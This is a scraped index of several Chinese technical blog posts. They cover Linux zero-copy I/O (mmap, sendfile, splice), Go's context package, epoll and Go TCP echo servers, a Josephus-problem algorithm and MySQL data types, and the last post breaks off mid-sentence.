我们平时一直提及的物理内存就是上文中对应的第三种计算机存储器，RAM 主存，它在计算机中以内存条的形式存在，嵌在主板的内存槽上，用来加载各式各样的程序与数据以供 CPU 直接运行和使用。\n虚拟内存 在计算机领域有一句如同摩西十诫般神圣的哲言：\u0026quot;计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决\u0026quot;，从内存管理、网络模型、并发调度甚至是硬件架构，都能看到这句哲言在闪烁着光芒，而虚拟内存则是这一哲言的完美实践之一。\n1  静态重定位` --\u0026gt; `动态重定位` --\u0026gt; `交换(swapping)技术` --\u0026gt; `虚拟内存   用户态和内核态 因为操作系统的资源是有限的，如果访问资源的操作过多，必然会消耗过多的系统资源，而且如果不对这些操作加以区分，很可能造成资源访问的冲突。所以，为了减少有限资源的访问和使用冲突，Unix/Linux 的设计哲学之一就是：对不同的操作赋予不同的执行等级，就是所谓特权的概念。简单说就是有多大能力做多大的事，与系统相关的一些特别关键的操作必须由最高特权的程序来完成。\n用户进程在系统中运行时，大部分时间是处在用户态空间里的，在其需要操作系统帮助完成一些用户态没有特权和能力完成的操作时就需要切换到内核态。那么用户进程如何切换到内核态去使用那些内核资源呢？答案是：1) 系统调用（trap），2) 异常（exception）和 3) 中断（interrupt）。\nI/O 缓冲区 read(2)/write(2) 是 Linux 系统中最基本的 I/O 读写系统调用，我们开发操作 I/O 的程序时必定会接触到它们，而在这两个系统调用和真实的磁盘读写之间存在一层称为 Kernel buffer cache 的缓冲区缓存。在 Linux 中 I/O 缓存其实可以细分为两个：Page Cache 和 Buffer Cache，这两个其实是一体两面，共同组成了 Linux 的内核缓冲区（Kernel Buffer Cache）\nI/O 模式 在 Linux 或者其他 Unix-like 操作系统里，I/O 模式一般有三种：\n 程序控制 I/O 中断驱动 I/O DMA I/O:DMA 全称是 Direct Memory Access，也即直接存储器存取，是一种用来提供在外设和存储器之间或者存储器和存储器之间的高速数据传输。整个过程无须 CPU 参与，数据直接通过 DMA 控制器进行快速地移动拷贝，节省 CPU 的资源去做其他工作。  一次完整的读磁盘文件然后写出到网卡的底层传输过程如下：\n可以清楚看到这里一共触发了 4 次用户态和内核态的上下文切换，分别是 read()/write() 调用和返回时的切换，2 次 DMA 拷贝，2 次 CPU 拷贝，加起来一共 4 次拷贝操作。\n通过引入 DMA，我们已经把 Linux 的 I/O 过程中的 CPU 拷贝次数从 4 次减少到了 2 次，但是 CPU 拷贝依然是代价很大的操作，对系统性能的影响还是很大，特别是那些频繁 I/O 的场景，更是会因为 CPU 拷贝而损失掉很多性能，我们需要进一步优化，降低、甚至是完全避免 CPU 拷贝。\n零拷贝 (Zero-copy) 零拷贝技术是指计算机执行操作时，CPU不需要先将数据从某处内存复制到另一个特定区域。这种技术通常用于通过网络传输文件时节省 CPU 周期和内存带宽。\nZero-copy 能做什么？  减少甚至完全避免操作系统内核和用户应用程序地址空间这两者之间进行数据拷贝操作，从而减少用户态 \u0026ndash; 内核态上下文切换带来的系统开销。 减少甚至完全避免操作系统内核缓冲区之间进行数据拷贝操作。 帮助用户进程绕开操作系统内核空间直接访问硬件存储接口操作数据。 利用 DMA 而非 CPU 来完成硬件接口和内核缓冲区之间的数据拷贝，从而解放 CPU，使之能去执行其他的任务，提升系统性能。  Zero-copy 的实现方式有哪些？ 从 zero-copy 这个概念被提出以来，相关的实现技术便犹如雨后春笋，层出不穷。但是截至目前为止，并没有任何一种 zero-copy 技术能满足所有的场景需求，还是计算机领域那句无比经典的名言：\u0026ldquo;There is no silver bullet\u0026rdquo;!\n而在 Linux 平台上，同样也有很多的 zero-copy 技术，新旧各不同，可能存在于不同的内核版本里，很多技术可能有了很大的改进或者被更新的实现方式所替代，这些不同的实现技术按照其核心思想可以归纳成大致的以下三类：\n 减少甚至避免用户空间和内核空间之间的数据拷贝：在一些场景下，用户进程在数据传输过程中并不需要对数据进行访问和处理，那么数据在 Linux 的 Page Cache 和用户进程的缓冲区之间的传输就完全可以避免，让数据拷贝完全在内核里进行，甚至可以通过更巧妙的方式避免在内核里的数据拷贝。这一类实现一般是通过增加新的系统调用来完成的，比如 Linux 中的 mmap()，sendfile() 以及 splice() 等。 绕过内核的直接 I/O：允许在用户态进程绕过内核直接和硬件进行数据传输，内核在传输过程中只负责一些管理和辅助的工作。这种方式其实和第一种有点类似，也是试图避免用户空间和内核空间之间的数据传输，只是第一种方式是把数据传输过程放在内核态完成，而这种方式则是直接绕过内核和硬件通信，效果类似但原理完全不同。 内核缓冲区和用户缓冲区之间的传输优化：这种方式侧重于在用户进程的缓冲区和操作系统的页缓存之间的 CPU 拷贝的优化。这种方法延续了以往那种传统的通信方式，但更灵活。  减少甚至避免用户空间和内核空间之间的数据拷贝 mmap() 1 2 3 4  #include \u0026lt;sys/mman.h\u0026gt;  void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); int munmap(void *addr, size_t length);   一种简单的实现方案是在一次读写过程中用 Linux 的另一个系统调用 mmap() 替换原先的 read()，mmap() 也即是内存映射（memory map）：把用户进程空间的一段内存缓冲区（user buffer）映射到文件所在的内核缓冲区（kernel buffer）上。\n利用 mmap() 替换 read()，配合 write() 调用的整个流程如下：\n 用户进程调用 mmap()，从用户态陷入内核态，将内核缓冲区映射到用户缓存区； DMA 控制器将数据从硬盘拷贝到内核缓冲区； mmap() 返回，上下文从内核态切换回用户态； 用户进程调用 write()，尝试把文件数据写到内核里的套接字缓冲区，再次陷入内核态； CPU 将内核缓冲区中的数据拷贝到的套接字缓冲区； DMA 控制器将数据从套接字缓冲区拷贝到网卡完成数据传输； write() 返回，上下文从内核态切换回用户态。  通过这种方式，有两个优点：一是节省内存空间，因为用户进程上的这一段内存是虚拟的，并不真正占据物理内存，只是映射到文件所在的内核缓冲区上，因此可以节省一半的内存占用；二是省去了一次 CPU 拷贝，对比传统的 Linux I/O 读写，数据不需要再经过用户进程进行转发了，而是直接在内核里就完成了拷贝。所以使用 mmap() 之后的拷贝次数是 2 次 DMA 拷贝，1 次 CPU 拷贝，加起来一共 3 次拷贝操作，比传统的 I/O 方式节省了一次 CPU 拷贝以及一半的内存，不过因为 mmap() 也是一个系统调用，因此用户态和内核态的切换还是 4 次。\nmmap() 因为既节省 CPU 拷贝次数又节省内存，所以比较适合大文件传输的场景。虽然 mmap() 完全是符合 POSIX 标准的，但是它也不是完美的，因为它并不总是能达到理想的数据传输性能。首先是因为数据数据传输过程中依然需要一次 CPU 拷贝，其次是内存映射技术是一个开销很大的虚拟存储操作：这种操作需要修改页表以及用内核缓冲区里的文件数据汰换掉当前 TLB 里的缓存以维持虚拟内存映射的一致性。但是，因为内存映射通常针对的是相对较大的数据区域，所以对于相同大小的数据来说，内存映射所带来的开销远远低于 CPU 拷贝所带来的开销。此外，使用 mmap() 还可能会遇到一些需要值得关注的特殊情况，例如，在 mmap() \u0026ndash;\u0026gt; write() 这两个系统调用的整个传输过程中，如果有其他的进程突然截断了这个文件，那么这时用户进程就会因为访问非法地址而被一个从总线传来的 SIGBUS 中断信号杀死并且产生一个 core dump。有两种解决办法：\n 设置一个信号处理器，专门用来处理 SIGBUS 信号，这个处理器直接返回， write() 就可以正常返回已写入的字节数而不会被 SIGBUS 中断，errno 错误码也会被设置成 success。然而这实际上是一个掩耳盗铃的解决方案，因为 BIGBUS 信号的带来的信息是系统发生了一些很严重的错误，而我们却选择忽略掉它，一般不建议采用这种方式。 通过内核的文件租借锁（这是 Linux 的叫法，Windows 上称之为机会锁）来解决这个问题，这种方法相对来说更好一些。我们可以通过内核对文件描述符上读/写的租借锁，当另外一个进程尝试对当前用户进程正在进行传输的文件进行截断的时候，内核会发送给用户一个实时信号：RT_SIGNAL_LEASE 信号，这个信号会告诉用户内核正在破坏你加在那个文件上的读/写租借锁，这时 write() 系统调用会被中断，并且当前用户进程会被 SIGBUS 信号杀死，返回值则是中断前写的字节数，errno 同样会被设置为 success。文件租借锁需要在对文件进行内存映射之前设置，最后在用户进程结束之前释放掉。  sendfile() 使用 sendfile() 完成一次数据读写的流程如下：\n 用户进程调用 sendfile() 从用户态陷入内核态； DMA 控制器将数据从硬盘拷贝到内核缓冲区； CPU 将内核缓冲区中的数据拷贝到套接字缓冲区； DMA 控制器将数据从套接字缓冲区拷贝到网卡完成数据传输； sendfile() 返回，上下文从内核态切换回用户态。  基于 sendfile()， 整个数据传输过程中共发生 2 次 DMA 拷贝和 1 次 CPU 拷贝，这个和 mmap() + write() 相同，但是因为 sendfile() 只是一次系统调用，因此比前者少了一次用户态和内核态的上下文切换开销。读到这里，聪明的读者应该会开始提问了：\u0026quot;sendfile() 会不会遇到和 mmap() + write() 相似的文件截断问题呢？\u0026quot;，很不幸，答案是肯定的。sendfile() 一样会有文件截断的问题，但欣慰的是，sendfile() 不仅比 mmap() + write() 在接口使用上更加简洁，而且处理文件截断时也更加优雅：如果 sendfile() 过程中遭遇文件截断，则 sendfile() 系统调用会被中断杀死之前返回给用户进程其中断前所传输的字节数，errno 会被设置为 success，无需用户提前设置信号处理器，当然你要设置一个进行个性化处理也可以，也不需要像之前那样提前给文件描述符设置一个租借锁，因为最终结果还是一样的。\nsendﬁle() with DMA Scatter/Gather Copy 上一小节介绍的 sendfile() 技术已经把一次数据读写过程中的 CPU 拷贝的降低至只有 1 次了，但是人永远是贪心和不知足的，现在如果想要把这仅有的一次 CPU 拷贝也去除掉，有没有办法呢？\n当然有！通过引入一个新硬件上的支持，我们可以把这个仅剩的一次 CPU 拷贝也给抹掉：Linux 在内核 2.4 版本里引入了 DMA 的 scatter/gather \u0026ndash; 分散/收集功能，并修改了 sendfile() 的代码使之和 DMA 适配。scatter 使得 DMA 拷贝可以不再需要把数据存储在一片连续的内存空间上，而是允许离散存储，gather 则能够让 DMA 控制器根据少量的元信息：一个包含了内存地址和数据大小的缓冲区描述符，收集存储在各处的数据，最终还原成一个完整的网络包，直接拷贝到网卡而非套接字缓冲区，避免了最后一次的 CPU 拷贝：\nsendfile() + DMA gather 的数据传输过程如下：\n 用户进程调用 sendfile()，从用户态陷入内核态； DMA 控制器使用 scatter 功能把数据从硬盘拷贝到内核缓冲区进行离散存储； CPU 把包含内存地址和数据长度的缓冲区描述符拷贝到套接字缓冲区，DMA 控制器能够根据这些信息生成网络包数据分组的报头和报尾 DMA 控制器根据缓冲区描述符里的内存地址和数据大小，使用 scatter-gather 功能开始从内核缓冲区收集离散的数据并组包，最后直接把网络包数据拷贝到网卡完成数据传输； sendfile() 返回，上下文从内核态切换回用户态。  基于这种方案，我们就可以把这仅剩的唯一一次 CPU 拷贝也给去除了（严格来说还是会有一次，但是因为这次 CPU 拷贝的只是那些微乎其微的元信息，开销几乎可以忽略不计），理论上，数据传输过程就再也没有 CPU 的参与了，也因此 CPU 的高速缓存再不会被污染了，也不再需要 CPU 来计算数据校验和了，CPU 可以去执行其他的业务计算任务，同时和 DMA 的 I/O 任务并行，此举能极大地提升系统性能。\nsplice() 数据传输过程图：\n使用 splice() 完成一次磁盘文件到网卡的读写过程如下：\n 用户进程调用 pipe()，从用户态陷入内核态，创建匿名单向管道，pipe() 返回，上下文从内核态切换回用户态； 用户进程调用 splice()，从用户态陷入内核态； DMA 控制器将数据从硬盘拷贝到内核缓冲区，从管道的写入端\u0026quot;拷贝\u0026quot;进管道，splice() 返回，上下文从内核态回到用户态； 用户进程再次调用 splice()，从用户态陷入内核态； 内核把数据从管道的读取端\u0026quot;拷贝\u0026quot;到套接字缓冲区，DMA 控制器将数据从套接字缓冲区拷贝到网卡； splice() 返回，上下文从内核态切换回用户态。  相信看完上面的读写流程之后，读者肯定会非常困惑：说好的 splice() 是 sendfile() 的改进版呢？sendfile() 好歹只需要一次系统调用，splice() 居然需要三次，这也就罢了，居然中间还搞出来一个管道，而且还要在内核空间拷贝两次，这算个毛的改进啊？\n我最开始了解 splice() 的时候，也是这个反应，但是深入学习它之后，才渐渐知晓个中奥妙，且听我细细道来：\n先来了解一下 pipe buffer 管道，管道是 Linux 上用来供进程之间通信的信道，管道有两个端：写入端和读出端，从进程的视角来看，管道表现为一个 FIFO 字节流环形队列：\n","permalink":"https://kevinerr.github.io/posts/tech/dpdk/","summary":"前置知识 网卡(Network Interface Card，简称NIC) https://blog.csdn.net/hellozhxy/article/details/120711251 UIO （Linux Userspace I/O） 作用 作为高并发大流量网络开发框架的DPDK，能够避免内核中断爆","title":"Dpdk"},{"content":"context 一个接口、四种具体实现、六个函数\n1 2 3 4 5 6 7 8 9 10  type Context interface {   Deadline() (deadline time.Time, ok bool)   Done() \u0026lt;-chan struct{}   Err() error   Value(key interface{}) interface{} }    Deadline返回绑定当前context的任务被取消的截止时间；如果没有设定期限，将返回ok == false。 Done 当绑定当前context的任务被取消时，将返回一个关闭的channel；如果当前context不会被取消，将返回nil。 Err 如果Done返回的channel没有关闭，将返回nil;如果Done返回的channel已经关闭，将返回非空的值表示任务结束的原因。如果是context被取消，Err将返回Canceled；如果是context超时，Err将返回DeadlineExceeded。 Value 返回context存储的键值对中当前key对应的值，如果没有对应的key,则返回nil  emptyCtx emptyCtx是一个int类型的变量，但实现了context的接口。emptyCtx没有超时时间，不能取消，也不能存储任何额外信息，所以emptyCtx用来作为context树的根节点。\n但我们一般不会直接使用emptyCtx，而是使用由emptyCtx实例化的两个变量，分别可以通过调用Background和TODO方法得到，但这两个context在实现上是一样的\nBackground和TODO只是用于不同场景下： Background通常被用于主函数、初始化以及测试中，作为一个顶层的context，也就是说一般我们创建的context都是基于Background；而TODO是在不确定使用什么context的时候才会使用。\nvalueCtx 1 2 3 4 5 6 7 8 9 10 11  type valueCtx struct {  Context  key, val interface{} }  func (c *valueCtx) Value(key interface{}) interface{} {  if c.key == key {  return c.val  }  return c.Context.Value(key) }   valueCtx利用一个Context类型的变量来表示父节点context，所以当前context继承了父context的所有信息；valueCtx类型还携带一组键值对，也就是说这种context可以携带额外的信息。valueCtx实现了Value方法，用以在context链路上获取key对应的值，如果当前context上不存在需要的key,会沿着context链向上寻找key对应的值，直到根节点。\nWithValue WithValue用以向context添加键值对：\n1 2 3 4 5 6 7 8 9  func WithValue(parent Context, key, val interface{}) Context {  if key == nil {  panic(\u0026#34;nil key\u0026#34;)  }  if !reflect.TypeOf(key).Comparable() {  panic(\u0026#34;key is not comparable\u0026#34;)  }  return \u0026amp;valueCtx{parent, key, val} }   这里添加键值对不是在原context结构体上直接添加，而是以此context作为父节点，重新创建一个新的valueCtx子节点，将键值对添加在子节点上，由此形成一条context链。获取value的过程就是在这条context链上由尾部上前搜寻：\nwhy？\ncancelCtx 1 2 3 4 5 6 7 8 9 10 11 12 13  type cancelCtx struct {  Context   mu sync.Mutex // protects following fields  done chan struct{} // created lazily, closed by first cancel call  children map[canceler]struct{} // set to nil by the first cancel call  err error // set to non-nil by the first cancel call }  type canceler interface {  cancel(removeFromParent bool, err error)  Done() \u0026lt;-chan struct{} }   跟valueCtx类似，cancelCtx中也有一个context变量作为父节点；变量done表示一个channel，用来表示传递关闭信号；children表示一个map，存储了当前context节点下的子节点；err用于存储错误信息表示任务结束的原因。mu就是用来保护这几个字段的锁，以保障cancelCtx是线程安全的\nWithCancel WithCancel函数用来创建一个可取消的context，即cancelCtx类型的context。WithCancel返回一个context和一个CancelFunc，调用CancelFunc即可触发cancel操作\n1 2 3 4 5  func WithCancel(parent Context) (ctx Context, cancel CancelFunc) {  c := newCancelCtx(parent)  propagateCancel(parent, \u0026amp;c)  return \u0026amp;c, func() { c.cancel(true, Canceled) } }   timerCtx timerCtx是一种基于cancelCtx的context类型，从字面上就能看出，这是一种可以定时取消的context。\n1 2 3 4 5 6 7 8 9 10  type timerCtx struct {  cancelCtx  timer *time.Timer // Under cancelCtx.mu.   deadline time.Time }  func (c *timerCtx) Deadline() (deadline time.Time, ok bool) {  return c.deadline, true }   WithDeadline WithDeadline返回一个基于parent的可取消的context，并且其过期时间deadline不晚于所设置时间d。\nWithTimeout 与WithDeadline类似，WithTimeout也是创建一个定时取消的context，只不过WithDeadline是接收一个过期时间点，而WithTimeout接收一个相对当前时间的过期时长timeout\nhttps://juejin.cn/post/7053781262690942990\n总结 context主要用于父子任务之间的同步取消信号，本质上是一种协程调度的方式。另外在使用context时有两点值得注意：上游任务仅仅使用context通知下游任务不再需要，但不会直接干涉和中断下游任务的执行，由下游任务自行决定后续的处理操作，也就是说context的取消操作是无侵入的；context是线程安全的，因为context本身是不可变的（immutable），因此可以放心地在多个协程中传递使用。\n","permalink":"https://kevinerr.github.io/posts/tech/context/","summary":"context 一个接口、四种具体实现、六个函数 1 2 3 4 5 6 7 8 9 10 type Context interface { Deadline() (deadline time.Time, ok bool) Done() \u0026lt;-chan struct{} Err() error Value(key interface{}) interface{} } Deadline返回绑定当前context的任务被","title":"Context"},{"content":"从 Go 源码目录结构和对应代码文件了解到 Go 在不同平台下的网络 I/O 模式的有不同实现。比如，在 Linux 系统下基于 epoll，freeBSD 系统下基于 kqueue，以及 Windows 系统下基于 iocp。\n因为我们的代码都是部署在Linux上的，所以本文以epoll封装实现为例子来讲解Go语言中I/O多路复用的源码实现。\nhttps://cloud.tencent.com/developer/article/1787492\nEPOLL  与select，poll一样，对I/O多路复用的技术 只关心“活跃”的链接，无需遍历全部描述符集合 能够处理大量的链接请求(系统可以打开的文件数目)  创建EPOLL 1 2 3 4 5 6  /** * @param size 告诉内核监听的数目 * * @returns 返回一个epoll句柄（即一个文件描述符） */ int epoll_create(int size);   1  int epfd = epoll_create(1000);   创建一个epoll句柄，实际上是在内核空间，建立一个红黑树的root根节点，这个根节点的关系与epfd相对应。\n控制EPOLL 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  /** * @param epfd 用epoll_create所创建的epoll句柄 * @param op 表示对epoll监控描述符控制的动作 * * EPOLL_CTL_ADD(注册新的fd到epfd) * EPOLL_CTL_MOD(修改已经注册的fd的监听事件) * EPOLL_CTL_DEL(epfd删除一个fd) * * @param fd 需要监听的文件描述符 * @param event 告诉内核需要监听的事件 * * @returns 成功返回0，失败返回-1, errno查看错误信息 */ int epoll_ctl(int epfd, int op, int fd,struct epoll_event *event);   struct epoll_event { \t__uint32_t events; /* epoll 事件 */ \tepoll_data_t data; /* 用户传递的数据 */ }  /* * events : {EPOLLIN, EPOLLOUT, EPOLLPRI, EPOLLHUP, EPOLLET, EPOLLONESHOT} */ typedef union epoll_data { \tvoid *ptr; \tint fd; \tuint32_t u32; \tuint64_t u64; } e   1 2 3 4 5 6  struct epoll_event new_event;  new_event.events = EPOLLIN | EPOLLOUT;//写、读 new_event.data.fd = 5;  epoll_ctl(epfd, EPOLL_CTL_ADD, 5, \u0026amp;new_event);   创建一个用户态的事件，绑定到某个fd上，然后添加到内核中的epoll红黑树中。\n等待EPOLL 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  /** * * @param epfd 用epoll_create所创建的epoll句柄 * @param event 从内核得到的事件集合 * @param maxevents 告知内核这个events有多大, * 注意: 值 不能大于创建epoll_create()时的size. * @param timeout 超时时间 * -1: 永久阻塞 * 0: 立即返回，非阻塞 * \u0026gt;0: 指定微秒 * * @returns 成功: 有多少文件描述符就绪,时间到时返回0 * 失败: -1, errno 查看错误 */ int epoll_wait(int epfd, struct epoll_event *event,int maxevents, int timeout);   使用\n1 2 3  struct epoll_event my_event[1000];  int event_cnt = epoll_wait(epfd, my_event, 1000, -1);   epoll_wait是一个阻塞的状态，如果内核检测到IO的读写响应，会抛给上层的epoll_wait, 返回给用户态一个已经触发的事件队列，同时阻塞返回。开发者可以从队列中取出事件来处理，其中事件里就有绑定的对应fd是哪个(之前添加epoll事件的时候已经绑定)。\n使用epoll编程主流程骨架 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  int epfd = epoll_crete(1000);  //将 listen_fd 添加进 epoll 中 epoll_ctl(epfd, EPOLL_CTL_ADD, listen_fd,\u0026amp;listen_event);  while (1) { \t//阻塞等待 epoll 中 的fd 触发 \tint active_cnt = epoll_wait(epfd, events, 1000, -1);  \tfor (i = 0 ; i \u0026lt; active_cnt; i++) { \tif (evnets[i].data.fd == listen_fd) { \t//accept. 并且将新accept 的fd 加进epoll中. \t} \telse if (events[i].events \u0026amp; EPOLLIN) { \t//对此fd 进行读操作 \t} \telse if (events[i].events \u0026amp; EPOLLOUT) { \t//对此fd 进行写操作 \t} \t} }   (1) 水平触发 水平触发的主要特点是，如果用户在监听epoll事件，当内核有事件的时候，会拷贝给用户态事件，但是如果用户只处理了一次，那么剩下没有处理的会在下一次epoll_wait再次返回该事件。\n这样如果用户永远不处理这个事件，就导致每次都会有该事件从内核到用户的拷贝，耗费性能，但是水平触发相对安全，最起码事件不会丢掉，除非用户处理完毕。\n(2) 边缘触发  边缘触发，相对跟水平触发相反，当内核有事件到达， 只会通知用户一次，至于用户处理还是不处理，以后将不会再通知。这样减少了拷贝过程，增加了性能，但是相对来说，如果用户马虎忘记处理，将会产生事件丢的情况。\n模型1、单线程Accept+单线程读写业务 模型2、单线程Accept+多线程读写业务 模型3、单线程多路IO复用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  //telnet localhost 2001 package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;net\u0026#34; \t\u0026#34;os\u0026#34; )  func main() { \tservice := \u0026#34;:2001\u0026#34; \ttcpAddr, err := net.ResolveTCPAddr(\u0026#34;tcp\u0026#34;, service) \tcheckError(err)  \tmylistener, err := net.ListenTCP(\u0026#34;tcp\u0026#34;, tcpAddr) \tcheckError(err)  \tfor { \tconn, err := mylistener.Accept() \tif err != nil { \tcontinue \t} \thandleRequest(conn) \tconn.Close()  \t}  } func checkError(err error) { \tif err != nil { \tfmt.Println(\u0026#34;Fatal error :\u0026#34;, err.Error()) \tos.Exit(1) \t} }  func handleRequest(conn net.Conn) { \tvar mybuff [512]byte \tfor { \tn, err := conn.Read(mybuff[0:]) \tif err != nil { \treturn \t} \tfmt.Println(string(mybuff[0:])) \tfmt.Println(\u0026#34;localaddr is:\u0026#34;, conn.LocalAddr()) \tfmt.Println(\u0026#34;remoteaddr is:\u0026#34;, conn.RemoteAddr()) \tfmt.Println(\u0026#34;##########\u0026#34;)  \t_, err2 := conn.Write(mybuff[0:n]) \tif err2 != nil { \treturn \t} \t}  }   go的accept底层就实现了IO多路复用\n模型4、单线程多路IO复用+多线程读写业务（工作池） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;net\u0026#34; \t\u0026#34;os\u0026#34; )  func main() { \tservice := \u0026#34;:2001\u0026#34; \ttcpAddr, err := net.ResolveTCPAddr(\u0026#34;tcp\u0026#34;, service) \tcheckError(err)  \tmylistener, err := net.ListenTCP(\u0026#34;tcp\u0026#34;, tcpAddr) \tcheckError(err) \tfor { \t\tconn, err := mylistener.Accept() \tdefer conn.Close() \tif err != nil { \tcontinue \t} \tgo handleRequest(conn) \t \t}  } func checkError(err error) { \tif err != nil { \tfmt.Println(\u0026#34;Fatal error :\u0026#34;, err.Error()) \tos.Exit(1) \t} }  func handleRequest(conn net.Conn) { \tvar mybuff [512]byte \tfor { \tn, err := conn.Read(mybuff[0:]) \tif err != nil { \treturn \t} \tfmt.Println(string(mybuff[0:])) \tfmt.Println(\u0026#34;localaddr is:\u0026#34;, conn.LocalAddr()) \tfmt.Println(\u0026#34;remoteaddr is:\u0026#34;, conn.RemoteAddr()) \tfmt.Println(\u0026#34;##########\u0026#34;)  \t_, err2 := conn.Write(mybuff[0:n]) \tif err2 != nil { \treturn \t} \t}  }    模型5、单线程IO复用+多线程IO复用（链接线程池） 模型5、单进程多路IO复用+多进程多路IO复用（进程池） 模型6、单线程多路IO复用+多线程多路IO复用+多线程 总结 综上，我们整理了7中Server的服务器处理结构模型，每个模型都有各自的特点和优势，那么对于多少应付高并发和高CPU利用率的模型，目前多数采用的是模型五(或模型五进程版，如Nginx就是类似模型五进程版的改版)。\n至于并发模型并非设计的约复杂越好，也不是线程开辟的越多越好，我们要考虑硬件的利用与和切换成本的开销。模型六设计就极为复杂，线程较多，但以当今的硬件能力无法支撑，反倒导致该模型性能极差。所以对于不同的业务场景也要选择适合的模型构建，并不是一定固定就要使用某个来应用。\n","permalink":"https://kevinerr.github.io/posts/tech/io%E5%A4%8D%E7%94%A8/","summary":"从 Go 源码目录结构和对应代码文件了解到 Go 在不同平台下的网络 I/O 模式的有不同实现。比如，在 Linux 系统下基于 epoll，freeBSD 系统下基于 kque","title":"Io复用"},{"content":"玩游戏 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; int n,k; int main() {  cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;k;  queue\u0026lt;int\u0026gt; q;  for(int i =1;i\u0026lt;=n;i++) q.push(i);  while(k--){  int a;  cin\u0026gt;\u0026gt;a;  a%=q.size();  for(int i =1;i\u0026lt;=a;i++){  q.push(q.front());  q.pop();  }   cout\u0026lt;\u0026lt;q.front()\u0026lt;\u0026lt;\u0026#34; \u0026#34;;  q.pop();  }  return 0; }   招聘 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #include \u0026lt;iostream\u0026gt; using namespace std;  const int N = 1010; int a[N];  int main() {  int t; cin \u0026gt;\u0026gt; t;  while(t--) {  int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m;  for(int i = 1; i \u0026lt;= m; i++) cin \u0026gt;\u0026gt; a[i];  int res = 0;  for(int i = 1; i \u0026lt;= n; i++) {  res = (res + a[1 + (n - i) % m]) % i;  }  cout \u0026lt;\u0026lt; res \u0026lt;\u0026lt; endl;  }  return 0; }   总结 数据小用模拟、数据大用dp\n简单复述约瑟夫环问题的解法：\n f[1] = 0; i \u0026gt; 1, f[i] = (f[i - 1] + m) % i;  这边我们先把结论抛出了。之后带领大家一步一步的理解这个公式是什么来的。 递推公式： f(N,M)=(f(N−1,M)+M)%N\nf ( N , M ) f(N,M)表示，N个人报数，每报到M时杀掉那个人，最终胜利者的编号 f ( N − 1 , M ) f(N-1,M)表示，N-1个人报数，每报到M时杀掉那个人，最终胜利者的编号\n","permalink":"https://kevinerr.github.io/posts/algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/","summary":"玩游戏 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; int n,k; int main() { cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;k; queue\u0026lt;int\u0026gt; q; for(int i =1;i\u0026lt;=n;i++) q.push(i); while(k--){ int a; cin\u0026gt;\u0026gt;a; a%=q.size(); for(int i =1;i\u0026lt;=a;i++){ q.push(q.front()); q.pop(); } cout\u0026lt;\u0026lt;q.front()\u0026lt;\u0026lt;\u0026#34; \u0026#34;; q.pop(); } return 0; } 招聘 1 2 3 4 5 6 7 8 9 10","title":"约瑟夫环"},{"content":"第四章 Schema与数据类型优化 4.1 选择优化的数据类型 几个简单的原则 更小的通常更好\neg：能用varchar(1)就不用开varchar(10)\n简单就好\neg:能用整型就不要用字符串；使用mysql内建的类型来存储日期，而不是字符串；用整型来存储ip地址\n尽量避免使用NULL\n计划在某列上建索引，避免设计成可为NULL的列\n值得一提的是InnoDB使用单独的位来存储NULL值，适合稀疏数据\n4.1.1 整数类型    TINYINT 很小的整数 1个字节     SMALLINT 小的整数 2个宇节   MEDIUMINT 中等大小的整数 3个字节   INT (INTEGHR) 普通大小的整数 4个字节   BIGINT 大整数 8个字节    对于存储和计算来说INT(1)和INT(11)是相同的，不会限制值得合法范围，只是显示字符的个数不同\n4.1.2 实数类型 MySQL中支持浮点数的类型有FLOAT、DOUBLE和DECIMAL类型，DECIMAL 类型不同于FLOAT和DOUBLE，DECIMAL 实际是以串存放的。对于精度比较高的东西，比如money，建议使用decimal类型。但decimal需要额外的空间和计算开销。\n数据量比较大的时候也可以用BIGINT代替decimal，先乘以相应的倍数存入数据库，这也可以同时避免浮点数计算不准确和decimal计算开销的问题\n4.1.3 字符串类型 char：定长，效率高，一般用于固定长度的表单提交数据存储 ；例如：身份证号，手机号，密码的hash值，性别等\nvarchar：不定长，效率偏低，需要额外的字节来记录长度，255中介线，varchar(10)需要11个字节来存储，varchar(1000)需要1002个字节来存储\n而在保存较大文本时，通常会选择使用TEXT或者BLOB。二者之间的主要差别是BLOB能用来保存二进制数据，比如照片；而TEXT只能保存字符数据，比如一遍文章或日记。\n4.1.4 日期和时间类型    类型 占据字节 表示形式     datetime 8 字节 yyyy-mm-dd hh:mm:ss   timestamp 4 字节 yyyy-mm-dd hh:mm:ss       类型 表示范围     datetime \u0026lsquo;1000-01-01 00:00:00.000000\u0026rsquo; to \u0026lsquo;9999-12-31 23:59:59.999999\u0026rsquo;   timestamp \u0026lsquo;1970-01-01 00:00:01.000000\u0026rsquo; to \u0026lsquo;2038-01-19 03:14:07.999999\u0026rsquo;    timestamp 只占 4 个字节，而且是以utc的格式储存， 它会自动检索当前时区并进行转换。\ndatetime以 8 个字节储存，不会进行时区的检索.\n也就是说，对于timestamp来说，如果储存时的时区和检索时的时区不一样，那么拿出来的数据也不一样。对于datetime来说，存什么拿到的就是什么。\n还有一个区别就是如果存进去的是NULL，timestamp会自动储存当前时间，而 datetime会储存 